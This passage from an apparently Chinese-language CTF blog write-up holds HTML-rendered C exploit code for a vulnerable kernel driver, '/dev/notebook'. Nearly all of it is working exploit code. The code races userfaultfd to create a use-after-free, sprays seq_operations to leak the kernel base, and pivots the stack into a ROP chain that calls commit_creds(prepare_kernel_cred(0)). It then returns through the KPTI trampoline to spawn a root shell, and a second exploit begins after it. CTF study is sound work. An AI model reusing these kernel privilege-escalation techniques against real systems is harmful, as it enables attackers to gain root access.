class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// sleep(1);   //ç»™1sç¼“å†²æ—¶é—´ï¼Œè®©sizeå€¼å†™ä¸Š</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);              <span class="comment">// in kernel it will kmalloc(0x20)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)ret_buf;</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            index = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. leak kernel base: read heap1</span></span><br><span class="line">    kernel_base = leak_addr - (single_start_func - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. hijack control flow: write heap1, then trigger &#x27;seq_operations-&gt;start&#x27;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> control_rip = add_rsp_1a8 - bzImage_base + kernel_base;</span><br><span class="line">    write_note((<span class="keyword">char</span>*)&amp;control_rip,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 7. stack pivot: use the gift func ^_^</span></span><br><span class="line">    save_status();</span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">1</span>,<span class="number">0x200</span>,name);</span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    heap_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);                 <span class="comment">// heap addr</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> gadget_buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gadget_buf[a++] = pop_rdi_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;                                     </span><br><span class="line">    gadget_buf[a++] = pkc_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = pop_rsi_pop_rdx_pop_ret - bzImage_base + kernel_base;     <span class="comment">// mov rdi, rax</span></span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = pop_rbp_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = mov_rdi_rax_pop_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = cc_addr - bzImage_base + kernel_base;;</span><br><span class="line">    gadget_buf[a++] = kpti_trampoline_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;           </span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = (<span class="keyword">uint64_t</span>)getshell;</span><br><span class="line">    gadget_buf[a++] = user_cs;</span><br><span class="line">    gadget_buf[a++] = user_rflags;</span><br><span class="line">    gadget_buf[a++] = user_sp;</span><br><span class="line">    gadget_buf[a++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write_note(gadget_buf,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. trigger</span></span><br><span class="line">    temp_fd = fd[index];</span><br><span class="line">    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x13131313;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x12121212;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x10101010;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, pop_rsp_ret;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, heap_addr;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x99999999;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp3"   >
          <a href="#exp3" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3>
      <blockquote>
<p>ç”¨æˆ·æ€æ³¨å†Œsignal handlerï¼Œ è·å¾—root shell</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_start_func = <span class="number">0xFFFFFFFF8128C230</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_1a8 = <span class="number">0xffffffff816473a4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsp_ret = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kpti_trampoline_addr = <span class="number">0xFFFFFFFF81A0093F</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_pop_rdx_pop_ret = <span class="number">0xffffffff810d7324</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rbp_ret = <span class="number">0xffffffff81478d44</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_rdi_rax_pop_ret = <span class="number">0xffffffff8110d81a</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_pop_ret = <span class="number">0xffffffff810637d4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> iretq = <span class="number">0xFFFFFFFF81A009E7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> cc_addr = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pkc_addr = <span class="number">0xFFFFFFFF810A9EF0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span 